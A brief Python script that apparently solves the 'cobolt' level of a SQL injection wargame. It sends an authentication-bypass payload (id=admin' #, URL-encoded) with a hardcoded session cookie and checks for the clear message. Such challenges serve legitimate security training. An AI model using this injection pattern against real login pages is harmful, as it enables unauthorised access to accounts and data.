import requests

url = "https://los.rubiya.kr/chall/cobolt_b876ab5595253427d3bc34f1cd8f30db.php?"
cookie = {'PHPSESSID':'aiub2r5p1f79164953a9ofa28v'}

def solve():
    query = "id=admin%27%20%23"
    res = requests.get(url=url+query,cookies=cookie)
    if "COBOLT Clear!" in res.text:
        print("COBOLT Clear!")

if __name__ == "__main__":
    solve()